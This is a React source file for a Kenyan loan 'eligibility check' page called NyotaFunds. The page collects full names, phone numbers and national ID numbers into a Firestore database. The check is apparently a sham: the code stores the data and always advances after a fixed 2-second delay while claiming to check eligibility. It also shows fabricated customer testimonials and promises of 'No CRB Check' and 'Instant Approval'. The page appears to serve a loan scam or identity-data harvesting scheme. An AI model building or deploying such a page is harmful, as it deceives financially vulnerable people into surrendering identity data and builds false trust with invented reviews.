import { useState } from "react";
import { db } from "../firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";

const LOAN_TYPES = ["Business Loan", "Personal Loan", "Education Loan", "Medical Loan", "Emergency Loan"];

export default function EligibilityForm({ onSubmit, onAdmin }) {
  const [form, setForm] = useState({ fullName: "", phone: "", idNumber: "", loanType: "" });
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => setForm({ ...form, [e.target.name]: e.target.value });

  const handleSubmit = () => {
    setLoading(true);

    // Try to save to Firestore but don't wait for it — always proceed
    try {
      addDoc(collection(db, "applications"), {
        ...form,
        status: "pending",
        createdAt: serverTimestamp(),
      }).catch((e) => console.error("Firestore:", e));
    } catch (e) {
      console.error("Firestore:", e);
    }

    // Always navigate after 2 seconds no matter what
    setTimeout(() => {
      setLoading(false);
      onSubmit(form);
    }, 2000);
  };

  return (
    <div className="nyota-bg min-h-screen">
      <header className="nyota-header">
        <div className="nyota-logo">Nyota<span>Funds</span></div>
        <button className="admin-link" onClick={onAdmin}>Admin</button>
      </header>

      <div className="stepper">
        <div className="step active"><div className="step-circle active">1</div><span>Check</span></div>
        <div className="step-line" />
        <div className="step"><div className="step-circle">2</div><span>Select</span></div>
        <div className="step-line" />
        <div className="step"><div className="step-circle">3</div><span>Get Cash</span></div>
      </div>

      <div className="nyota-card">
        <div className="card-badge">Ksh 1,500 – 60,000</div>
        <h1 className="card-title">Check Your Loan Eligibility</h1>
        <p className="card-sub">Find out how much you qualify for instantly</p>

        <div className="form-group">
          <label>Full Name</label>
          <input name="fullName" value={form.fullName} onChange={handleChange} placeholder="Enter your full name" className="nyota-input" />
        </div>
        <div className="form-group">
          <label>Phone Number</label>
          <input name="phone" value={form.phone} onChange={handleChange} placeholder="0712345678" className="nyota-input" maxLength={10} />
        </div>
        <div className="form-group">
          <label>ID Number</label>
          <input name="idNumber" value={form.idNumber} onChange={handleChange} placeholder="Enter your ID number" className="nyota-input" />
        </div>
        <div className="form-group">
          <label>Select Loan Type</label>
          <select name="loanType" value={form.loanType} onChange={handleChange} className="nyota-input">
            <option value="">Choose loan type</option>
            {LOAN_TYPES.map((t) => <option key={t} value={t}>{t}</option>)}
          </select>
        </div>

        <button className="nyota-btn" onClick={handleSubmit} disabled={loading}>
          {loading ? (
            <span style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
              <span className="btn-spinner" /> Checking your eligibility...
            </span>
          ) : "Check Eligibility"}
        </button>

        <div className="trust-row">
          <span>🔒 Secure Application</span>
          <span>✅ No CRB Check</span>
          <span>⚡ Instant Approval</span>
        </div>
      </div>

      <div className="testimonials">
        <h2>What Our Customers Say</h2>
        <p className="testi-sub">Trusted by thousands of Kenyans across the country</p>
        <div className="testi-grid">
          {[
            { initials: "JM", name: "James Mwangi", loc: "Nairobi", text: "Got KSh 5,000 in less than 10 minutes — no paperwork, no stress!" },
            { initials: "FA", name: "Faith Akinyi", loc: "Kisumu", text: "This is the only one that actually works without CRB checks. Truly chapchap!" },
            { initials: "PN", name: "Peter Njoroge", loc: "Nakuru", text: "The M-Pesa integration is seamless. Applied, got approved instantly." },
          ].map((t) => (
            <div className="testi-card" key={t.name}>
              <div className="testi-avatar">{t.initials}</div>
              <div>
                <div className="testi-name">{t.name}</div>
                <div className="testi-loc">{t.loc}</div>
              </div>
              <p className="testi-text">"{t.text}"</p>
            </div>
          ))}
        </div>
      </div>

      <footer className="nyota-footer">
        <span>📄 No paperwork required.</span>
        <span>👥 No guarantors needed.</span>
        <div className="copyright">© 2026 Nyota Funds. All rights reserved.</div>
      </footer>
    </div>
  );
}